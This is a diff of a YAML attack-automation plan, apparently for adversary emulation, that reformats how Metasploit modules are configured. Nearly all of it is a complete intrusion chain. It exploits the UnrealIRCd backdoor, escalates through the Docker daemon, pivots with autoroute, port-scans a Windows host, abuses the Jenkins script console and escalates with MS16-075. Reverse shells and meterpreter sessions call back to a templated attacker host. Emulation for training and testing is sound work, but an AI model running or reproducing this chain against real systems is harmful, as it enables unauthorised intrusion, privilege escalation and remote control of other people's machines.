@@ -49,13 +49,11 @@ plan:
           create_named_session: session-ircd
           module: metasploit
           module_arguments:
-            module_type: exploit
-            module: unix/irc/unreal_ircd_3281_backdoor
-            module_options:
+            module_name: unix/irc/unreal_ircd_3281_backdoor
+            datastore:
+              PAYLOAD: cmd/unix/reverse_perl
               RHOSTS: {{ ubuntu.host }}
               RPORT: 6697
-            payload: cmd/unix/reverse_perl
-            payload_options:
               LHOST: {{ attacker.host }}
               LPORT: 4445
         next:
@@ -72,13 +70,10 @@ plan:
           create_named_session: session-ubuntu-root
           module: metasploit
           module_arguments:
-            session_target: {{ ubuntu.host }}
-            module_type: exploit
-            module: linux/local/docker_daemon_privilege_escalation
-            module_options:
+            module_name: linux/local/docker_daemon_privilege_escalation
+            datastore:
               SESSION: $exploit-ircd.session_id
-            payload: linux/x64/meterpreter/reverse_tcp
-            payload_options:
+              PAYLOAD: linux/x64/meterpreter/reverse_tcp
               LHOST: {{ attacker.host }}
               LPORT: 4446
 
@@ -101,6 +96,7 @@ plan:
             module: command
             module_arguments:
               command: sysinfo
+              force_shell: false
           next:
             - type: result
               value: ok
@@ -164,9 +160,8 @@ plan:
           arguments:
             module: metasploit
             module_arguments:
-              module_type: post
-              module: multi/manage/autoroute
-              module_options:
+              module_name: multi/manage/autoroute
+              datastore:
                 CMD: autoadd
                 NETMASK: 255.255.255.0
                 SESSION: $exploit-dockerd-privesc.session_id
@@ -188,9 +183,8 @@ plan:
         arguments:
           module: metasploit
           module_arguments:
-            module_type: auxiliary
-            module: scanner/portscan/tcp
-            module_options:
+            module_name: scanner/portscan/tcp
+            datastore:
               PORTS: 20-25,53,80,135,443,3389,8000,8080,8443,8888
               RHOSTS: {{ windows.host }}
               TIMEOUT: 50
@@ -213,14 +207,12 @@ plan:
             create_named_session: session-jenkins
             module: metasploit
             module_arguments:
-              module_type: exploit
-              module: multi/http/jenkins_script_console
-              module_options:
+              module_name: multi/http/jenkins_script_console
+              datastore:
                 RHOSTS: {{ windows.host }}
                 RPORT: 8484
                 TARGETURI: /
-              payload: windows/meterpreter/reverse_tcp
-              payload_options:
+                PAYLOAD: windows/meterpreter/reverse_tcp
                 LHOST: {{ attacker.host }}
                 LPORT: 4447
           next:
@@ -237,13 +229,10 @@ plan:
             create_named_session: session-windows-root
             module: metasploit
             module_arguments:
-              session_target: {{ attacker.host }}  # This is due to the nature of the exploit
-              module_type: exploit
-              module: windows/local/ms16_075_reflection_juicy
-              module_options:
+              module_name: windows/local/ms16_075_reflection_juicy
+              datastore:
                 SESSION: $exploit-jenkins.session_id
-              payload: windows/meterpreter/reverse_tcp
-              payload_options:
+                PAYLOAD: windows/meterpreter/reverse_tcp
                 LHOST: {{ attacker.host }}
                 LPORT: 4448
 
@@ -265,7 +254,7 @@ plan:
             use_named_session: session-windows-root
             module: command
             module_arguments:
-              command: execute -f whoami -i -a /all
+              command: whoami /all
           next:
             - type: result
               value: ok
@@ -280,4 +269,4 @@ plan:
             use_named_session: session-windows-root
             module: command
             module_arguments:
-              command: execute -f tasklist -i
+              command: tasklist
